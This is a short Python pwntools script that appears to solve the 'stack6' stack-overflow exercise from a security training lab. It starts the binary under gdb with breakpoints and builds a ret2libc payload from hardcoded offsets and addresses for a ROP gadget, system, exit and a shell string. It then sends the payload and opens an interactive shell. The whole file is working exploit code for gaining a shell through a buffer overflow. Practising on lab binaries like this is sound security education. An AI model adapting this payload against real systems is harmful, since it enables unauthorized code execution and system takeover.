#!/usr/bin/python
#solved locally without attaching gdb
from pwn import *

context.binary = "./stack6"
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p = gdb.debug('./stack6', gdbscript='''
                                            b *main
                                            b *getpath+59
                                            b *getpath+143
                                            continue
                                        ''')

offset = 117
offset_eax = 129
rop_addr = 0x5655568c
system_addr = 0xf7dca150
exit_addr =  0xf7dbc440
shell_addr = 0xf7f3f0f5

payload = flat({offset:0x5655568c, offset_eax:0x5655568c}, system_addr, exit_addr, shell_addr)

p.sendline(payload) 
p.interactive()